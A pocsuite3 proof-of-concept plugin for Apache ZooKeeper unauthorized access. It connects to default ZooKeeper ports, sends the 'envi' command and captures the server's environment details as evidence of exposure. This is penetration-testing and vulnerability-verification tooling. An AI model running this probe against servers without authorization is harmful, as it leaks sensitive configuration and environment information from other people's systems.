#!/usr/bin/env python
# coding: utf-8
import socket
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2018-12-25'
    createDate = '2018-12-25'
    updateDate = '2018-12-25'
    references = ['', ]
    name = 'Apache ZooKeeper unauthorized access'
    appPowerLink = ''
    appName = 'zookeeper'
    appVersion = 'All'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    Apache Zookeeper安装部署之后默认情况下不需要身份认证，攻击者可通过该漏洞泄露服务器的敏感信息。
    '''

    def _verify(self):
        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [2181, 12181, 22181]
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((pr.hostname, port))
                s.send(b'envi')
                info = s.recv(4096)
                if b'zookeeper.version' in info:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}:{}'.format(
                        pr.hostname, port)
                    result['extra'] = {}
                    result['extra']['evidence'] = info.decode('utf-8').strip()
                    break
            except:
                # raise
                pass
            finally:
                s.close()

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
